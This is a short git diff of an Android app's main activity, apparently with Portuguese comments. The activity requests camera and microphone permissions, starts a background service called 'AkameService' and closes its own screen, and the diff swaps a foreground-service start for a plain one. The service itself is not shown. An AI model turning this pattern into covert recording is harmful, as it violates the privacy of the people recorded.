@@ -12,21 +12,12 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        verificarPermissoes();
-    }
-
-    private void verificarPermissoes() {
         String[] permissions = {Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO};
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, permissions, 200);
+            ActivityCompat.requestPermissions(this, permissions, 101);
         } else {
-            iniciarProtocolo();
+            startService(new Intent(this, AkameService.class));
+            finish();
         }
-    }
-
-    private void iniciarProtocolo() {
-        Intent serviceIntent = new Intent(this, AkameService.class);
-        ContextCompat.startForegroundService(this, serviceIntent);
-        finish(); // Fecha a tela, mas a Akame continua viva no serviço
     }
 }
